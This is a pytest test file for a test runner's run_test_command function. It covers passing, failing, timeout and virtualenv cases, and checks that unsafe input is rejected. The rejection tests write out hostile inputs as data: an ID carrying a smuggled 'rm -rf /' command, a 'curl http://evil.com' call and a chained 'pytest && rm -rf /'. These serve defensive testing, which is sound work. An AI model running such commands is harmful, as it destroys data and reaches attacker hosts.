"""Tests for the shared test runner (pipeline/testing.py)."""

from __future__ import annotations

import sys

import pytest

from hadron.pipeline.testing import run_test_command

# Use the current interpreter's pytest to avoid PATH issues in subprocess shells.
_PYTEST_CMD = f"{sys.executable} -m pytest"


class TestRunTestCommand:
    @pytest.mark.asyncio
    async def test_successful_pytest(self, tmp_path) -> None:
        # Create a trivial test file so pytest succeeds
        (tmp_path / "test_ok.py").write_text("def test_pass(): pass\n")
        passed, output = await run_test_command(
            str(tmp_path), f"{_PYTEST_CMD} -x", "CR-abc123"
        )
        assert passed is True

    @pytest.mark.asyncio
    async def test_failing_pytest(self, tmp_path) -> None:
        (tmp_path / "test_fail.py").write_text("def test_fail(): assert False\n")
        passed, output = await run_test_command(
            str(tmp_path), f"{_PYTEST_CMD} -x", "CR-abc"
        )
        assert passed is False
        assert "FAILED" in output or "failed" in output.lower()

    @pytest.mark.asyncio
    async def test_unsafe_cr_id_rejected(self, tmp_path) -> None:
        passed, output = await run_test_command(
            str(tmp_path), "pytest", "CR;rm -rf /"
        )
        assert passed is False
        assert "unsafe characters" in output

    @pytest.mark.asyncio
    async def test_rejected_command(self, tmp_path) -> None:
        passed, output = await run_test_command(
            str(tmp_path), "curl http://evil.com", "CR-abc"
        )
        assert passed is False
        assert "rejected by allowlist" in output

    @pytest.mark.asyncio
    async def test_shell_metacharacters_rejected(self, tmp_path) -> None:
        passed, output = await run_test_command(
            str(tmp_path), "pytest && rm -rf /", "CR-abc"
        )
        assert passed is False
        assert "rejected by allowlist" in output

    @pytest.mark.asyncio
    async def test_timeout(self, tmp_path) -> None:
        # python -m pytest with a test that sleeps
        (tmp_path / "test_slow.py").write_text(
            "import time\ndef test_slow(): time.sleep(30)\n"
        )
        passed, output = await run_test_command(
            str(tmp_path), f"{_PYTEST_CMD} -x", "CR-abc",
            timeout=1,
        )
        assert passed is False
        assert "timed out" in output

    @pytest.mark.asyncio
    async def test_uses_worktree_venv(self, tmp_path) -> None:
        """run_test_command activates the worktree .venv when present."""
        from unittest.mock import AsyncMock, MagicMock, patch

        venv_bin = tmp_path / ".venv" / "bin"
        venv_bin.mkdir(parents=True)

        mock_proc = MagicMock()
        mock_proc.communicate = AsyncMock(return_value=(b"ok\n", None))
        mock_proc.returncode = 0

        with patch("hadron.pipeline.testing.asyncio.create_subprocess_shell", return_value=mock_proc) as mock_shell:
            await run_test_command(str(tmp_path), "pytest -x", "CR-abc")
            env_passed = mock_shell.call_args.kwargs["env"]
            assert str(venv_bin) in env_passed["PATH"]
            assert env_passed["VIRTUAL_ENV"] == str(tmp_path / ".venv")

    @pytest.mark.asyncio
    async def test_no_venv_still_works(self, tmp_path) -> None:
        """run_test_command works without a worktree .venv (non-Python projects)."""
        from unittest.mock import AsyncMock, MagicMock, patch

        mock_proc = MagicMock()
        mock_proc.communicate = AsyncMock(return_value=(b"ok\n", None))
        mock_proc.returncode = 0

        with patch("hadron.pipeline.testing.asyncio.create_subprocess_shell", return_value=mock_proc) as mock_shell:
            await run_test_command(str(tmp_path), "npm test", "CR-abc")
            env_passed = mock_shell.call_args.kwargs["env"]
            # No worktree venv, so VIRTUAL_ENV should not point to tmp_path
            if "VIRTUAL_ENV" in env_passed:
                assert str(tmp_path) not in env_passed["VIRTUAL_ENV"]
